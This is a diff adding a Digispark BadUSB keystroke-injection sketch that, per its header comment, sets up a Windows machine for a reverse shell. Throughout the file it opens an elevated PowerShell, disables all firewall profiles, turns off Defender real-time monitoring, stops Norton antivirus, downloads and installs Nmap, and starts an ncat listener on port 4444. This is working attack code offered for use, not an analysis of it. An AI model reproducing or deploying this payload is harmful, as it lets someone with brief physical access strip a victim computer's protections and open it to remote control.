@@ -1,0 +1,85 @@
+//script for DOWNLOADING NMAP ON WINDOWS AND INSTALLING IT FOR TAKING REVERSE SHELL
+#include <DigiKeyboard.h>
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+}
+
+void loop() {
+  // prevent missing the first character after a delay:
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Start-Process powershell -Verb runAs");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Stop-Service -Name Norton AntiVirus");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("https://nmap.org/dist/nmap-7.93-setup.exe");   //CAN CHANGE THE DOWNLOAD LINK FOR LATEST NMAP
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(20000);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("downloads");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_N);             // FOR SEARCHING NMAP IN DOWNLOADED SECTION 
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);    // GIVING PERMISSIONS TO INSTALL
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");       //OPENING POWERSHELL IN NMAP DOWNLAODED FORLDER TO RUN COMMAND (C:\Program Files (x86)\Nmap)
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("ncat.exe -nlvp 4444");     //STARTING THE SESSION ON WINDOWS
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+    
+for(;;){
+    
+  }
+}
